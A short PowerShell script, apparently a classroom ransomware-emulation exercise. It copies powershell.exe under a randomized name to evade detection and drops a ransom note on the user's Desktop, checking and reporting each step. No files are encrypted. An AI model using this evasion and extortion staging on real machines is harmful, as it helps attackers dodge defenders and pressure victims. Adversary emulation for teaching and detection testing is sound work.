<#
    This step creates a copy of the Powershell executable,
    and obfuscates the name to decrease chance of detection.
#>

# Create randomized name for target file
$file = $env:USERPROFILE + "\EnNoB-" + (Get-Random -Minimum 1000 -Maximum 9876) + ".exe"

# Copy Powershell executable to target file
Copy-Item -Path "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination $file

# Check to see if target file exists
if (Test-Path $file) {
    Write-Host -ForegroundColor "Green" "[+] Copied Powershell executable was found. File path is: $file"
}
else {
    Write-Host -ForegroundColor "Red" "[!] Copied Powershell executable was not found!"
}

# Create ransom note
$notePath = $env:USERPROFILE + "\Desktop\Readme.READ"

"If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you." | `
    Out-File -FilePath $notePath

# Check to see if ransom note exists
if (Test-Path $notePath) {
    Write-Host -ForegroundColor "Green" "[+] Ransom note was found."
}
else {
    Write-Host -ForegroundColor "Red" "[!] Ransom note was not found!"
}